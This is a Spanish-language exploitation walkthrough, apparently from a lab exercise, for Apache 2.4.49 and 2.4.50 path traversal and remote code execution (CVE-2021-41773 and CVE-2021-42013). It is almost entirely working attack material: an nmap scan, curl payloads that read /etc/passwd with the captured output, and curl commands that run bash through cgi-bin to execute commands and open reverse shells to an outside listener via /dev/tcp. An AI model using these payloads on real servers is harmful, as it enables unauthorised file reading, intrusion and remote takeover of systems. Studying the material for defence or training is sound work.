# Apache - CVE-2021_41773-42013
___
## CVE-2021-41773/42013
___
## Apache 2.4.49 without CGI enabled
___
Primero debemos escanear los puertos y verificar la versión de apache.
```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sS 10.10.35.226 -Pn -v -n -sCV
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 c4:d2:05:be:6c:3c:aa:1b:d6:77:71:56:6d:ad:dd:f2 (RSA)
|   256 49:01:56:ef:5b:46:f3:ac:4f:8b:51:5c:66:cb:c9:3c (ECDSA)
|_  256 55:ee:ac:e3:17:1c:00:0e:ef:e0:44:81:f6:71:c8:ae (ED25519)
8080/tcp open   http       Apache httpd 2.4.49 ((Unix))
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.49 (Unix)	
8081/tcp open   http       Apache httpd 2.4.49 ((Unix))	|_http-server-header: Apache/2.4.49 (Unix)
| http-methods: 
|   Supported Methods: OPTIONS HEAD GET POST TRACE
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
```

Ya sabemos la versión de apache instalado, ahora vamos a generar una petición para extraer información.
```bash
curl -v 'http://10.10.35.226:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd'
```

Este es el resultado que debe salirnos.
```bash
*   Trying 10.10.35.226:8080...
* Connected to 10.10.35.226 (10.10.35.226) port 8080 (#0)	> GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd HTTP/1.1
> Host: 10.10.35.226:8080
> User-Agent: curl/7.81.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Sat, 26 Mar 2022 04:15:25 GMT
< Server: Apache/2.4.49 (Unix)
< Last-Modified: Mon, 27 Sep 2021 00:00:00 GMT
< ETag: "39e-5cceec7356000"
< Accept-Ranges: bytes
< Content-Length: 926
< 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin	nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
* Connection #0 to host 10.10.35.226 left intact
```

___
## Apache 2.4.49 with CGI enabled
___
Podemos generar ahora este payload para leer cualquier archivo.
```bash
curl -v 'http://10.10.35.226:8081/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'echo Content-Type: text/plain; echo; cat /etc/passwd' -H "Content-Type: text/plain"
```

Generar una reverse shell.
```bash
curl -v 'http://10.10.35.226:8081/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'echo Content-Type: text/plain; echo; bash -i >& /dev/tcp/10.11.60.52/1234 0>&1' -H "Content-Type: text/plain"
```

___
## Apache 2.4.50
___
Para esta versión se utiliza un payload diferente.
```bash
curl 'http://10.10.35.226:8082/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd'
```

Generando una reverse shell.
```bash
curl 'http://10.10.35.226:8083/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash' -d 'echo Content-Type: text/plain; echo; bash -i >& /dev/tcp/10.11.60.52/4444 0>&1' -H "Content-Type: text/plain"
```

Leer archivos.
```bash
curl 'http://10.10.35.226:8083/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash' -d 'echo Content-Type: text/plain; echo; cat /etc/passwd' -H "Content-Type: text/plain"
```

___
